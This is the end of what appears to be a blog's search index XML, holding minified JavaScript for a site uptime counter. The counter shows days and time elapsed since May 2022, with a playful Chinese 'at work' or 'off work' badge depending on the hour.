        <content type="html"><![CDATA[var now=new Date;function createtime(){var t=new Date("05/01/2022 00:00:00");now.setTime(now.getTime()+250);var e=(now-t)/1e3/60/60/24,a=Math.floor(e),n=(now-t)/1e3/60/60-24*a,r=Math.floor(n);1==String(r).length&&(r="0"+r);var s=(now-t)/1e3/60-1440*a-60*r,i=Math.floor(s);1==String(i).length&&(i="0"+i);var o=(now-t)/1e3-86400*a-3600*r-60*i,l=Math.round(o);1==String(l).length&&(l="0"+l);let g="";g=r<18&&r>=9?`<img class='boardsign' src='/img/badge/baicai-上班摸鱼中.svg' title='距离月入25k也就还差一个大佬带我~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`:`<img class='boardsign' src='/img/badge/baicai-下班啦.svg' title='下班了就该开开心心的玩耍，嘿嘿~'><span class='textTip'> <br> 本站居然运行了 ${a} 天</span><span id='runtime'> ${r} 小时 ${i} 分 ${l} 秒 </span> <i class='fas fa-heartbeat' style='color:red'></i>`,document.getElementById("workboard")&&(document.getElementById("workboard").innerHTML=g)}setInterval((()=>{createtime()}),250);]]></content>
      
    </entry>
    
    
  
</search>
